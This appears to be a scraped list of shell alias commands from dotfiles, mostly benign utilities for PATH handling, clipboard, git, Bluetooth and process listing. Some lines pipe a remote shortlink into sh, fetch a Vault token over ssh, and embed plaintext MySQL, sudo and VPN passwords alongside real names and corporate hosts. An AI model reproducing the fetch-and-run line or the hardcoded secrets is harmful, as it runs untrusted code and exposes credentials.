"export SSH_AUTH_SOCK=$(find /tmp -path ""*/ssh-*"" -name ""agent*"" -uid $(id -u) 2>/dev/null | tail -n1)"
"export PYTHONPATH=$(splunk_env.sh); echo ""exported PYTHONPATH =\n$PYTHONPATH"" | sed -e ""s/:/:\n/g"""
"export PS1=""\u | \W $ """
"export PS1=""\[\e[0;32m\]\u\[\e[0;37m\] | \[\e[0;36m\]\W \[\e[0m\]""$"
"export PREV=$(git symbolic-ref HEAD|cut -d/ -f3-) && git checkout -b ""$1"" && git commit -am ""$1"" && git checkout ""$PREV"""
"export PATH=$(echo $PATH | sed ""s/^.[^:]*://"")"
"export PATH=$(echo ""$PATH"" | sed -e ""s/\/Users\/bob\/anaconda3\/bin://"") ;\
"export MASTERSHA=`gshortsham` && gshortsham | tcopy && pbw ""Set masterCommitSHA $MASTERSHA"""
"export LD_PRELOAD=""$(echo ${LD_PRELOAD/\/usr\/local\/lib\/libstderred.so/}|sed s/\^\ //)"""
"export LANG=C; touch DIFF; rm DIFF; ln -s ~/DIFF .; svn diff > ~/DIFF/diff`date +%y%m%d%H%M-``(pwd | sed ""s/.*\///g"")`"".txt"""
"export LANG=C; find . | grep -i ""$1"""
"export JAVA_HOME=$JAVA_8_HOME;export PATH=$(echo $PATH | sed -E ""s,(/System)?/Library/Java/JavaVirtualMachines/[a-zA-Z0-9._]+/Contents/Home/bin:,,g"");export PATH=$JAVA_HOME/bin:$PATH"
"export JAVA_HOME=$JAVA_7_HOME;export PATH=$(echo $PATH | sed -E ""s,(/System)?/Library/Java/JavaVirtualMachines/[a-zA-Z0-9._]+/Contents/Home/bin:,,g"");export PATH=$JAVA_HOME/bin:$PATH"
"export JAVA_HOME=$JAVA_6_HOME;export PATH=$(echo $PATH | sed -E ""s,(/System)?/Library/Java/JavaVirtualMachines/[a-zA-Z0-9._]+/Contents/Home/bin:,,g"");export PATH=$JAVA_HOME/bin:$PATH"
"export JAVA_HOME=$JAVA_5_HOME;export PATH=$(echo $PATH | sed -E ""s,(/System)?/Library/Java/JavaVirtualMachines/[a-zA-Z0-9._]+/Contents/Home/bin:,,g"");export PATH=$JAVA_HOME/bin:$PATH"
"export HISTTIMEFORMAT=""%d/%m/%y %T""; history | grep -c `date ""+%d/%m/%y""`"
"export HISTORY_TODAY=""history$(date +""%y-%m-%d"")"" && cd ~/projects/terminal-history/ && history | cut -c 8- >> $HISTORY_TODAY && git add $HISTORY_TODAY && git commit -m ""Adding $HISTORY_TODAY"" && git push origin master"
"export GOPATH=$GOPATH:$(pwd | awk -F""src"" ""{print \$1}""); echo ""set GOPATH to $GOPATH"""
"export GOPATH=$(pwd | awk -F""src"" ""{print \$1}""); echo ""set GOPATH to $GOPATH"""
"export GIT_TMP_BRANCH=`git rev-parse --abbrev-ref HEAD | tr -d ""\n""`; git checkout master; git fetch origin; git rebase origin/master; git checkout ${GIT_TMP_BRANCH}"
"export GIT_FIXUP_PARENT=""$( git log --author=""${GIT_AUTHOR}"" --grep=""^fixup! "" --invert-grep --max-count=1 --format=format:%H | grep -v ""^gpg"" )"" && test -n ""${GIT_FIXUP_PARENT}"""
"export DATABASE_URL=$(echo $DATABASE_URL|sed -e ""s/192.168.0.2/127.0.0.1:9432/"")"
"export COMPOSE_FILE=`find ${PROJECT_PATH}/build -maxdepth 2 -type f -name docker-compose.yaml -printf ""${PROJECT_PATH}/build/%P:"" | sed ""s/:*$//""`; docker-compose push --ignore-push-failures"
"export COMPOSE_FILE=`find ${PROJECT_PATH}/build -maxdepth 2 -type f -name docker-compose.yaml -printf ""${PROJECT_PATH}/build/%P:"" | sed ""s/:*$//""`; docker-compose build --pull --compress"
"export COMPOSE_FILE=`find ${PROJECT_PATH} -maxdepth 2 -type f -name docker-compose.yaml -printf ""${PROJECT_PATH}/%P:"" | sed ""s/:*$//""`; docker-compose"
"export CLASSPATH=$(find /usr/share/fk-cms-backend/webapps/cms/WEB-INF/lib/|xargs -i echo -n ""{}:"")"
"export CLASSPATH=$(echo /Users/martin.ocker/Documents/xing/hive2/*.jar | tr ' ' ':'); java org.apache.hive.beeline.BeeLine -u 'jdbc:hive2://zk-1.hadoop-1.ams1.xing.com:2181,zk-2.hadoop-1.ams1.xing.com:2181,zk-3.hadoop-1.ams1.xing.com:2181/;serviceDiscoveryMode=zooKeeper;zooKeeperNamespace=hiveserver2' -n martin.ocker --color=true --showDbInPrompt=true"
"export CLASSPATH=""`pwd`/src/main:`pwd`/src/test:`mvn dependency:build-classpath | grep jar`"""
"export BRANCHSHA=`gshortshab` && gshortshab | tcopy && pbw ""Set branchCommitSHA $BRANCHSHA"""
"export $(ssh -A -i ${DIR}/${PRIVATE_KEY} ec2-user@${BASTION_HOST} ""env | grep VAULT_TOKEN"")"
"export $(grep -v ""^#"" .env | xargs -d ""\n"")"
"export $(grep -v ""^#"" .env | xargs -0)"
"export $(grep -v ""^#"" $(PWD)/.env | xargs)"
"export $(egrep -v ""^#"" .env | xargs)"
"expac -sH M ""%-30n %m"" | sort -hk 2"
"expac -HM ""%-20n\t%10d"" $( comm -23 <(pacman -Qqt | \
"expac -H M ""%m\t%n"" | sort -h"
"expac -H M ""%m\t%n"" | sort -h > /tmp/expac.txt && pacman -Qqm > /tmp/aur.txt && grep --color=never -w -F -f /tmp/aur.txt /tmp/expac.txt"
"expac -H M ""%m\t%n"" | sort -h "
"expac -H M ""%m %n"" | sort -n"
"expac -H M ""%011m\t%-20n\t%10d"" $(pqenb) | sort -n"
"expac -H M ""%011m\t%-20n\t%10d"" $(comm -23 <(pacman -Qqen | \
"expac --timefmt=""%Y-%m-%d %T"" ""%l\t%n"" | sort"
"expac ""%m %n"" | sort -n"
"exit g=git path='echo $PATH | tr : ""\n""' dt=""date +%Y-%m-%d"""
"execute-py-math(){ echo ""print($1)"" | python; };execute-py-math"
"exec 6<> /dev/tcp/ipinfo.io/80;echo -e 'GET / HTTP/1.0\r\nHost: ipinfo.io\r\n\r' >&6; cat 0<&6 | sed -r -n '/^\{/,/^\}/p'; exec 6>&-;"
"exa -s mod --git | rg ""$@"""
"exa -lhgba -I="".DS_Store|.git"" --group-directories-first"
"exa -lF --color=auto | grep ""^d"""
"exa -l | grep ""^d"""
"exa -l -s mod --git --time-style=long-iso | rg ""$@"""
"exa -a | egrep ""^\."""
"exa --tree --long --classify --all --group --sort=name -I="".git|.svn"""
"evince 2> >( grep -v ""evince.*WARNING"" | grep -v ""^\s*$"" >&2 )"
"eval sudo $(fc -l -1 | sed -E ""s/[0-9]+[ ]*(.)/\1/"")"
"eval echo ${PATH} | tr "":"" ""\n"""
"eval cd $(emacsclient -e ""(with-current-buffer (window-buffer (frame-selected-window)) default-directory)"" | "
"eval `fc -ln -2 -2 | sed -e ""s/^[[:space:]]*//""`"
"eval `export DISPLAY=""`tmux show-env | sed -n 's/^DISPLAY=//p'`""`"
"eval $(tmux show-env -s |grep ""^SSH_"")"
"eval $(sed -e ""s/^/export /"" .env|tr ""\n"" "";"")"
"eval $(cat ~/dotfiles/env.defaults ~/dotfiles/.env | grep -v ""^#"") /usr/bin/dotdrop --cfg=~/dotfiles/config.yaml"
"eval $(cat ~/.env | grep -v ""^#"") /usr/bin/dotdrop --cfg=~/Dropbox/dotfiles/config.yaml"
"eval $(cat ~/.dotfiles/.env.default ~/.dotfiles/.env | grep -v ""^#"") /usr/bin/dotdrop --cfg=~/.dotfiles/config.yaml"
"eval ""echo -n `pwd` | pbcopy"""
"eval ""$(thefuck $(fc -ln -1 | tail -n 1)); fc -R"""
"eval ""$(thefuck ""$(fc -ln -1 | tail -n 1)"")""; fc -R"
"eval ""$(ls ~/bin | fzf)"""
"eval ""$(fc -ln -1)"" | less"
"eval ""$(fc -ln -1) | pbcopy"""
"eval ""$(docker-machine env dev)""; env|grep DOCKER;echo docker-machine env dev set"
"eval ""$(curl -sSL http://bit.ly/dev-env | sh)"""
"ethPrice=`curl -s ""https://api.coinbase.com/v2/exchange-rates?currency=ETH"" | jq "".data.rates.EUR""`; echo ""1ETH=$ethPrice €"""
"etags `find $CODEDIR -name ""*.[h|c]""`"
"espeak --stdout ""boom! headshot"" | aplay -q"
"equery list ""*"" | grep"
"equery list ""*"" | grep -i"
"env | grep -i proxy && echo -e ""\nexport HTTP_PROXY HTTPS_PROXY NO_PROXY http_proxy https_proxy no_proxy"""
"env | grep -i ""$@"""
"env | grep ""^EC2_"""
"env | grep ""^AWS"""
"env | grep ""ROS"""
"env | grep ""AWS"""
"env | egrep --color=always ""^.*PATH"""
"env ps -wx -o pid=PID,%cpu=CPU,%mem=MEM,comm=CMD | head -15"
"env LESS= less -R ""/usr/share/X11/locale/$(grep --max-count=1 ""${LANG%.*}.UTF-8\$"" /usr/share/X11/locale/locale.dir | cut --delimiter=/ --fields 1)/Compose"""
"env LC_CTYPE=C tr -dc ""a-zA-Z0-9-_\$\?"" < /dev/urandom | head -c 64"
"env LC_CTYPE=C tr -dc ""a-zA-Z0-9-_\$\?"" < /dev/urandom | head -c 40"
"env LC_CTYPE=C tr -dc ""a-z0-9"" < /dev/urandom | head -c 64 && echo"
"env COLUMNS=500 ps -eo user,pid,ppid,cmd | grep -i"
"env $(egrep -v ""^#"" .env | xargs) docker stack deploy --compose-file docker-compose.yml"
"encfs ""/home/guillaume/Cloud/MEGAsync/Cloud Drive/Safe/"" /home/guillaume/safe-in-cloud/ && df -h | grep -i cloud"
"emacs -T ""`logname`@`uname -n` $CTPROJS"" -xrm ""Emacs*iconName: `echo $CTPROJS | cut -f1 -d:`(`uname -n`)"" $CTEMACS_OPTS"
"egrep -v \""^$|^#\"""
"egrep -v ""^\s+?#|^\s+?$"""
"egrep -v ""^\s*(#|$)"""
"egrep -v ""^\s*$|^\s*#"""
"egrep -v ""^[[:space:]]*($|#)"""
"egrep -v ""^[[:space:]]*(#|$)"""
"egrep -v ""^[[:blank:]]*#|^[[:blank:]]*$"""
"egrep -v ""^[ \t]*#|^[ \t]*$"""
"egrep -v ""^([[:space:]]*#.*|$)"""
"egrep -v ""^$|^[[:space:]]*#"""
"egrep -v ""^$|^#"""
"egrep -v ""^#|^$"""
"egrep -v ""^ *($|[;#])"""
"egrep -v ""\.terraform/|terraform.tfstate"""
"egrep -v ""/\\.|^\\.\[^/\]"""
"egrep -v ""(^#.*|^$)"""
"egrep -v ""(#|^$)"""
"egrep -v ""#|^$"""
"egrep -o ""\[[0-9][^ ]+"" | sed ""s#^.##"""
"egrep -n -v ""^#|^$"""
"egrep -i ""warn|err"""
"egrep -h ""$(date +""%m/%d|%b* %d"")"" /usr/share/calendar/calendar*"
"egrep -ahv ""^[[:space:]]*(#|$)"""
"egrep -REn CRASH:""\s+(\w+\.){2}\w+\s+\(\w+\s\w+\)"" *|grep ""email"""
"egrep --color=auto -v ""^$|^#"""
"egrep ""pac(new|save)"" /var/log/pacman.log"
"egrep ""id:|url:"""
"egrep ""class |def """
"egrep ""^sub |__END__"" \!*"
"egrep ""^flags.*(vmx|svm)"" /proc/cpuinfo"
"egrep ""^bind"" ~/.i3/config | cut -d "
"egrep ""^\w+\s+\w*\s*\*?\w+\("" *.c | while read file; do echo ""$file;""; done"
"egrep ""Host\ .*"" ~/.ssh/config | cut -f2 -d "" """
"effect=字符串转大写;_xX(){ echo ""$1"" | tr "
"effect=字符串转小写;_Xx(){ echo ""$1"" | tr "
"echo|mail -s ""Test von $HOSTNAME um `date`"" "
"echo|mail -s ""Job on $HOSTNAME done at `date +""%F %H:%M:%S""`"" mm@im.meissner.it"
"echo; echo $PATH | tr "":"" ""\n""; echo"
"echo; docker ps --format ""{{.ID}} {{.Names}}\tCreated: {{.RunningFor}}\t{{.Status}}"" | expand -t12;echo"
"echo | vim +""so %"" "
"echo | gcc -E -Wp,-v -"
"echo y""\n""y | pac -Scc"
"echo vpn- | smart, denver, dallas, toronto"
"echo testemail von $USER am $(date)|mail -s ""TESTEMAIL $USER $(date)"""
"echo ssh-keygen -t rsa -b 4096 -C ""your_email@example.com"" | pbcopy"
"echo one && echo two && echo 3 | wc -l;
"echo ipip.net:; curl myip.ipip.net; echo ip.sb:; curl -s https://api.ip.sb/geoip | jq '[.ip, .city, .region, .organization]';"
"echo https://redmine.nwwo.de/issues/$(branch_current | grep -oh ""^[0-9]\+"")"
"echo http://redmine.nwwo.de/issues/$(branch_current | grep -oh ""^[0-9]\+"")"
"echo http://$(hostname -I | cut -d"" "" -f 1):1337 && python -m SimpleHTTPServer 1337"
"echo bla|mail -s ""TESTEMAIL $USER $(date)"""
"echo `tr -dc ""[:alnum:]"" < /dev/urandom | head -c4`"
"echo `telnet bofh.jeffballard.us 666 2>/dev/null` |grep --color -o ""Your excuse is:.*$"""
"echo `hostname -f`::`ps aux | sed -n ""s/$USER.*Xvnc.*rfbport \([0-9]\+\).*/\1/p""`"
"echo `git-remote | sed -e ""s/\.git//""`/tree/`git rev-parse --abbrev-ref HEAD`"
"echo `env LC_CTYPE=C tr -dc ""a-zA-Z0-9-_\$\?"" < /dev/urandom | head -c 20`"
"echo `env LC_CTYPE=C tr -dc ""a-zA-Z0-9-_\$\?"" < /dev/urandom | head -c 10`"
"echo `date ""+%d %b %Y""` | pbcopy"
"echo `cb | cut -d '-' -f1,2`"
"echo `awk -v num=$RANDOM ""BEGIN { print (num / 10000) }""` | xargs -i bash -c ""echo sleeping {} seconds; sleep {}"""
"echo \$PATH | tr \"":\"" \""\n\"" "
"echo \$PATH | sed -e 's/^/ /' -e 's/:/
"echo \$PATH | awk '{c=split(\$0,a,\"
"echo \""show databases;\"" | mysql -hmysql01 -pR1m@dmin"
"echo [7, 2, 9, 1, 8, 5, 3, 0, 4, 6] | pbcopy;"
"echo [31, 26, 83, 12, 18, 27, 51, 67, 67, 69, 86, 78, 10, 41, 10, 30, 12, 92, 21, 7, 0, 6, 54, 55, 62, 35, 38, 80, 77, 88, 82, 61, 61, 6, 43, 22, 19, 42, 80, 54, 26, 15, 91, 64, 40, 30, 75, 93, 32, 21, 49, 98, 70, 81, 24, 58, 12, 59, 25, 27, 46, 9, 74, 41, 17, 43, 45, 39, 92, 51, 90, 64, 35, 30, 44, 47, 97, 65, 22, 7, 18, 55, 87, 92, 46, 49, 23, 50, 12, 21, 57, 52, 70, 94, 98, 54, 29, 47, 46, 86] | pbcopy;"
"echo Warning, this is avida 0.4b|figlet; sleep 1; /home/cns175/bin/hp9000s700/avida-0.4b"
"echo These are the biggest memory hogs!! && psMShowTotalMemory && ps axch -o cmd,%mem --sort=-%mem|head"
"echo These are the biggest CPU hogs!!! && ps axch -o cmd,%cpu --sort=-%cpu|head && echo BTW, here is your CPU temperature! && sensors"
"echo Th15 1Sn\'7 vi, 5Uc\|\<4\!"
"echo SUBSYSTEM==""usb"", ATTR{idVendor}==""22b8"", MODE=""0666"", GROUP=""plugdev"" | sudo tee /etc/udev/rules.d/51-android-usb.rules"
"echo Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean dapibus quis libero id mollis. Proin ultricies sit amet dui eu facilisis. Ut est odio, commodo ut volutpat sed, posuere vitae sapien. Morbi aliquet orci quis sem laoreet sodales. Donec a ultrices nisi. Proin ut purus malesuada, pellentesque lorem nec, rutrum augue. Nam congue interdum tortor id aliquet. Maecenas accumsan, neque eget dignissim consectetur, metus justo aliquam tellus, ac viverra nisl nisl et quam. Aenean at elit eu dui bibendum auctor. Quisque condimentum risus malesuada turpis interdum, nec mattis erat pellentesque. Phasellus orci diam, vulputate ut lectus eu, sollicitudin tincidunt nibh. Fusce eu libero pulvinar, dictum diam at, rutrum sapien. Integer eleifend, leo nec venenatis porttitor, massa nulla sagittis ante, ut accumsan nisl mauris ut est. Nulla facilisi. | pbcopy"
"echo Current IP Address: $(curl -s http://checkip.dyndns.org/ | grep -o ""[[:digit:].]\+"")"
"echo 80 | sudo tee /sys/devices/platform/smapi/BAT0/stop_charge_thresh \
"echo 256 | sudo tee -a /proc/sys/fs/inotify/max_user_instances &&
"echo 2 | publishhelper.sh -d -c ""LocTst.SqlS.Debug"" -p ""C:\inetpub\wwwroot\ConectaTeste"""
"echo 2 | publishhelper.sh -c ""LocTst.SqlS.Release"" -p ""C:\inetpub\wwwroot\ConectaTeste"""
"echo 123 | sudo -S sh -c ""echo 1 > /proc/sys/vm/drop_caches"""
"echo 123 | sudo -S dstat -lcdnmspyt -N eth0 -D total,sda,sdb"
"echo 100 | sudo tee /sys/devices/platform/smapi/BAT0/stop_charge_thresh \
"echo 0xbB49cd914B515B2050080440b9B7Ee86DBfD22cC |
"echo 0 | gdb -batch-silent -ex ""run"" -ex ""set logging overwrite on"" -ex ""set logging file gdb.bt"" -ex ""set logging on"" -ex ""set pagination off"" -ex ""handle SIG33 pass nostop noprint"" -ex ""echo backtrace:\n"" -ex ""backtrace full"" -ex ""echo \n\nregisters:\n"" -ex ""info registers"" -ex ""echo \n\ncurrent instructions:\n"" -ex ""x/16i \$pc"" -ex ""echo \n\nthreads backtrace:\n"" -ex ""thread apply all backtrace"" -ex ""set logging off"" -ex ""quit"" --args"
"echo /opt/var/cache/pixelserv:;ls -l /opt/var/cache/pixelserv/;ls /var/log/messages*; egrep ""missing|generated"" /var/log/messages"
"echo -ne ""ಠ_ಠ"" | pbcopy"
"echo -ne ""\nPATH:\n""; echo $PATH | tr "":"" ""\n"";"
"echo -ne ""\nLD_LIBRARY_PATH:\n""; echo $LD_LIBRARY_PATH | tr "":"" ""\n"";"
"echo -ne ""\e[32m"" ; while true ; do echo -ne ""\e[$(($RANDOM % 2 + 1))m"" ; tr -c ""[:print:]"" "" "" < /dev/urandom | dd count=1 bs=50 2> /dev/null ; done"
"echo -ne ""\e[31m"" ; while true ; do echo -ne ""\e[$(($RANDOM % 2 + 1))m"" ; tr -c ""[:print:]"" "" "" < /dev/urandom | dd count=1 bs=50 2> /dev/null ; sleep 0.1s ; done"
"echo -ne ""@\xd1\x96gnas"" | pbcopy"
"echo -n o | python -c ""import sys; print int(sys.argv[1], 8)"""
"echo -n https://github.com/quip/quip/commit/$(git log -n 1 --pretty=format:""%h"") | pbcopy"
"echo -n f | python -c ""import sys; print int(sys.argv[1], 16)"""
"echo -n `date ""+%Y/%m/%d %I:%M:%S %p""`|xsel -ib"
"echo -n `date ""+%Y%m%d-%H%M%S""`|xsel -ib; date ""+%Y%m%d-%H%M%S"""
"echo -n Test 1, 2. Test 1, 2. Test 1, 2, 3, 4. Hello? Hello? Anyone there? Time to read from the metro. Hub docs go after Ronald McDonald. Testing? Testing? All done. | pbcopy; echo mccopied"
"echo -n Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed fermentum lacinia egestas. Nullam auctor tortor euismod turpis egestas pretium. Aliquam ullamcorper nulla diam, a fermentum velit vehicula non. Pellentesque egestas enim vitae pellentesque pulvinar. Nam placerat dictum mattis. Nunc non augue molestie, ullamcorper dui eu, interdum nunc. In ac aliquet sapien. Cras viverra luctus nisl, nec iaculis mauris laoreet sed. Etiam eu tortor nec mauris semper accumsan at at turpis. | pbcopy; echo copied"
"echo -n 'constraints: ' >> cabal.config && stack list-dependencies | sed -e 's/ / == /' -e 's/$/,/' -e 's/^/ /' >> cabal.config"
"echo -n $(pwd) | pbcopy; echo ""copy to clipboard: $(pbpaste)"""
"echo -n ""ヽ༼ຈل͜ຈ༽ﾉ"" | pbcopy"
"echo -n ""┌∩┐(◣_◢)┌∩┐"" | LANG=en_US.UTF-8 pbcopy"
"echo -n ""ᕕ( ᐛ )ᕗ"" | xclip -selection clipboard"
"echo -n ""¯\_(ツ)¯\_"" | pbcopy"
"echo -n ""¯\_(ツ)_/¯""|pbcopy"
"echo -n ""¯\_(ツ)_/¯"" | xclip -selection clipboard"
"echo -n ""¯\_(ツ)_/¯"" | pbcopy"
"echo -n ""sudo dd if=/dev/zero of=/dev/sdb bs=2048 count=32"" | x && echo ""sudo dd if=/dev/zero of=/dev/sdb bs=2048 count=32"""
"echo -n ""puts [expr 1 + [clock format [clock seconds] -format %U ]]; exit"" | tclsh"
"echo -n ""previous"" | nc -4u -w0 localhost 8000"
"echo -n ""play"" | nc -4u -w0 localhost 8000"
"echo -n ""pause"" | nc -4u -w0 localhost 8000"
"echo -n ""next"" | nc -4u -w0 localhost 8000"
"echo -n ""mem"" | sudo tee -a /sys/power/state"
"echo -n ""https://www.youtube.com/watch?v=dQw4w9WgXcQ"" | pbcopy"
"echo -n ""https://i.imgur.com/1NmGgDU.jpg"" | pbcopy"
"echo -n ""dd bs=4M if=/path/to/archlinux.iso of=/dev/sdx status=progress oflag=sync"" | xclip -selection clipboard"
"echo -n ""cscope file list ... "" && mkcscope_file_list && echo ""$(cat cscope.files | wc -l) files done"" && echo -n ""cscope ... "" && cscope -Rbqk && echo ""done"""
"echo -n ""`pwd`"" | xclip -selection c"
"echo -n ""_/¯(ツ)_/¯"" | pbcopy"
"echo -n ""\u2122"" | pbcopy"
"echo -n ""\u2030"" | pbcopy"
"echo -n ""\e[1;32mTaking out teh trash:\e[0m "" | pv -qL 10 && rm -rf /home/jacka/.local/share/Trash/files"
"echo -n ""\`"" | xclip -selection clipboard"
"echo -n ""\033P1.y""$USER""@""$HOST"" -- ""$CTPROJS""\033\\""; echo -n ""\033P3.y""`echo $CTPROJS | cut -f1 -d:`\(`uname -n`\)""\033\\"""
"echo -n ""Repository: ""; basename `pwd`; git status | head -n 2"
"echo -n ""Meteo Strasbourg "" | pv -qL 20 && weatherman ""Strasbourg,France"" "
"echo -n ""Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua."" | pbcopy"
"echo -n ""Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."" | pbcopy"
"echo -n ""(╯°□°）╯︵ ┻━┻"" | LANG=en_US.UTF-8 pbcopy"
"echo -n ""(￣o￣) zzZZzzZZ"" | LANG=en_US.UTF-8 pbcopy"
"echo -n ""( ͡° ͜ʖ ͡°)"" | pbcopy"
"echo -n ""${1}"" | openssl sha1"
"echo -n ""$PWD"" | xsel -b"
"echo -n ""$PWD"" | cpy"
"echo -n ""$IFS"" | od -c"
"echo -n ""$(pwd)"" | xclip -selection clipboard"
"echo -n ""$(pwd)"" | pbcopy"
"echo -n """"|pbc"
"echo -n """" |pbcopy"
"echo -n """" | tee /var/log/pg_log/postgresql.log"
"echo -n """" | pbcopy"
"echo -n """" | kitty +kitten clipboard"
"echo -en ""\xe2\x80\x8b"" | xsel -i"
"echo -en ""\033[31m"" $(git diff master --name-only) | tr "" "" ""\n"""
"echo -en ""HTTP/1.1 200 OK\n\n $(date)\n"" | nc -l 127.0.0.1 8080 > /dev/null"
"echo -en ""$(pwd)"" | xclip -selection primary"
"echo -en ""$(bash /tmp/warsaw)""|pv -qL 40 #"
"echo -e \""root\nTestDB\n192.168.50.4:2002\"" | make run --quiet -C $PROJROOT/API"
"echo -e -n ""$(pwd)"" | xclip -in -selection clipboard"
"echo -e 'keymaps 0-2,4-6,8-9,12\nkeycode 58 = Control' | loadkeys"
"echo -e ""【昨日したこと】\\n【今日すること】\\n【課題感】\\n【ひとこと】\\n"" | pbcopy"
"echo -e ""tmuxinator configs:\n-------------------"" && ls -1 ~/.tmuxinator/ | sed -e ""s;.yml;;"""
"echo -e ""stats\r\nquit\r\n"" | nc localhost 11211"
"echo -e ""stats\nquit\n"" | nc -n 127.0.0.1 11211"
"echo -e ""power on\nconnect \t\nquit"" | bluetoothctl"
"echo -e ""power on\nconnect 30:00:00:02:88:2C \nquit"" | bluetoothctl"
"echo -e ""power on\nagent on\ndefault_agent\nscan on\ndevices\n"" | bluetoothctl -- command"
"echo -e ""power on"" | bluetoothctl"
"echo -e ""power off"" | bluetoothctl"
"echo -e ""nameserver 8.8.8.8\nnameserver 8.8.4.4""|sudo tee /etc/resolv.conf "
"echo -e ""nameserver 208.67.222.222\nnameserver 208.67.220.220""|sudo tee /etc/resolv.conf "
"echo -e ""nameserver 200.221.11.100\nnameserver 200.221.11.101""|sudo tee /etc/resolv.conf "
"echo -e ""import redis\nr = redis.StrictRedis(host=\""2.lp1.eu\"", port=6379, db=0)"" | python"
"echo -e ""disconnect\nquit"" | bluetoothctl"
"echo -e ""disconnect"" | bluetoothctl"
"echo -e ""connect FE:BF:2C:BE:A7:BB"" | bluetoothctl"
"echo -e ""connect C7:63:77:00:63:3D"" | bluetoothctl"
"echo -e ""connect 74:5C:4B:B4:3C:86\n"" | bluetoothctl"
"echo -e ""connect 20:73:16:10:1C:0F"" | bluetoothctl"
"echo -e ""connect 04:FE:A1:22:95:97"" | bluetoothctl"
"echo -e ""connect 00:13:EF:A0:04:49"" | bluetoothctl"
"echo -e ""base\ncalc\ndraw\nimpress\nmath\nquickstart\nwriter"" | dmenu"
"echo -e ""a\n*\nq\n""|git add -i"
"echo -e ""\nMy shortcuts: \n""; cat ~/.bash_aliases | grep "
"echo -e ""\n------------ Git Branch ------------ \n"";git branch;echo -e ""\n------------ Git Status ------------ \n"";git status;echo -e ""\n------------ Git Log -------------- \n"";git lg | head -n 12"
"echo -e ""\n ========== BUILDING ===========\n ...""; make V=1 2>&1 | tee .mk.log; \
"echo -e ""\e[36;1m${PWD}\e[m""; \pwd | xsel --clipboard --input"
"echo -e ""\033[31mLSOF OUTPUT (lsof -i):\033[0m"" && sleep 0.2; lsof -i && echo -e ""\033[31mLSOF OUTPUT DONE.\033[0m\n""; echo -e ""\n\033[31mNETSTAT OUTPUT (netstat -peanut):\033[0m"" && sleep 0.2; \netstat -peanut | sort && echo -e ""\033[31mNETSTAT OUTPUT DONE.\033[0m\n""; echo -e ""Try command \033[0;32mnetstat-plus\033[0m for a more torough network check\033[0m"""
"echo -e ""\033[31mLSOF OUTPUT (lsof -i):\033[0m"" && sleep 0.2; \lsof -i && echo -e ""\033[31mLSOF OUTPUT DONE.\033[0m\n""; echo -e ""\n\033[31mNETSTAT OUTPUT (netstat -peanut):\033[0m"" && sleep 0.2; \netstat -peanut | sort && echo -e ""\033[31mNETSTAT OUTPUT DONE.\033[0m\n""; echo -e ""\n\033[31mNMAP LOCAL OUTPUT (nmap -sT -O 127.0.0.1):\033[0m"" && sleep 0.2; \nmap -sT -O 127.0.0.1; echo -e ""\033[31mNMAP LOCAL OUTPUT DONE.\033[0m""; echo -e ""\n\033[31mNMAP OUTPUT (nmap -sT -O $(curl -skL v4.4ce.ca)):\033[0m"" && sleep 0.2; \nmap -sT -O $(curl -s v4.ident.me); echo -e ""\033[31mNMAP OUTPUT DONE.\033[0m"""
"echo -e ""[user.password]\npush"" | sudo openconnect --user=[user.name] --passwd-on-stdin --authgroup=Duo iceman.appdirect.com"
"echo -e ""[user.password]\npush"" | sudo openconnect --user=[user.name] --passwd-on-stdin --authgroup=Duo batman.appdirect.com"
"echo -e ""UPDATESTARTUPTTY\n/bye"" | gpg-connect-agent --no-autostart"
"echo -e ""Redirect to clipboard (middle mouse button MOUSE3)\nUse like this:\ncopy:\n\techo ""aaa"" | xclip\npaste:\n\txclip -o"""
"echo -e ""Public IP Address is:"" $(wget -q -O - checkip.dyndns.org | egrep -i -o ""[0-9]{3}\.[0-9]{3}\.[0-9]{3}\.[0-9]{3}"")"
"echo -e ""G=gg\n:wq\n"" | vim"
"echo -e ""Current folder: $PWD\nNumber of files contained in current folder: "";find . -type f -print | wc -l"
"echo -e ""CPU\tPROCESS"" && ps aux | awk "
"echo -e ""CONTAINER ID\t\tIMAGE\t\tCOMMAND\t\t\tCREATED\t\t\tSTATUS\t\tPORTS\t\t\tNAMES\t\t\t\t\tIP""; for container in `docker ps -q`; do ip=$(docker inspect -f ""{{ .NetworkSettings.IPAddress }}"" ${container} ); row=$(docker ps | grep ${container}); echo -ne ""${row}\t${ip}\n""; done"
"echo -e ""123S0ch1n"" | sudo openconnect navpn.agcocorp.com -u ""rochaal"" --passwd-on-stdin < /dev/tty"
"echo -e ""## 概要 \\n## 関連URL \\n## 技術・UI変更点 \\n## 完了の定義 \\n## 未完了タスク \\n## 備考 \\n## 今回保留した項目とTODOリスト \\n## レビュアー \\n"" | pbcopy"
"echo -e ""!_TAG_FILE_SORTED\t2\t/2=foldcase/"" > filenametags | find . -not -regex "
"echo -e "" development test staging prod4 prod3 prod2 production"";knife environment compare development test staging prod4 prod3 prod2 production | grep $1"
"echo -e "" \033[0;37m:\e[0;96mPandora\033[0;37m: \e[0;97m$(cat ~/.config/pianobarfly/nowplaying | sed "
"echo -e "" \033[0;37m:\e[0;96mPandora\033[0;37m: \e[0;95m$(cat ~/.config/pianobar/nowplaying | sed "
"echo -e "" \033[0;37m:\e[0;96mLastFM\033[0;37m: \e[0;95m$(cat ~/.shell-fm/nowplaying | sed "
"echo - | awk ""{printf \""%.1f\"", $(( $(cat /sys/class/power_supply/BAT0/current_now) err.txt generated.file succ.txt $(cat /sys/class/power_supply/BAT0/voltage_now) )) / 1000000000000 }"" ; echo "" W """
"echo 'vpn- | list, disconnect, reset, refresh, status, diagnostics'"
"echo 'top mem processes:' && ps axch -o cmd:15,%mem --sort=-%mem | head"
"echo 'top cpu processes:' && ps axch -o cmd:15,%cpu --sort=-%cpu | head"
"echo 'tmpfs /tmp tmpfs nodev,nosuid 0 0' >>/etc/fstab;mount -a;mount|grep tmp"
"echo 'rdr pass on lo0 inet proto tcp from any to any port {80,8080} -> 127.0.0.1 port 8080' | sudo pfctl -ef - > /dev/null 2>&1; echo '==> Forwarding Port: 80 -> 8080 & Enabling pf'"
